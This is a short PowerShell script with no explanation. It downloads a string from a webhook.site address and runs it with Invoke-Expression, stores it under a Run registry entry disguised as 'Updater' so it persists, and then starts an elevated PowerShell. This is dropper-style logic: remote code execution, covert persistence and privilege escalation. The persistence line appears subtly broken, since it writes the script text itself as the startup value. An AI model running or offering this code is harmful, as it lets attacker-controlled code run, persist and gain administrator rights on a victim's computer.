$client = New-Object Net.WebClient
$payload = $client.DownloadString("https://webhook.site/collect")
Invoke-Expression $payload
Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value $payload
Start-Process powershell -Verb RunAs
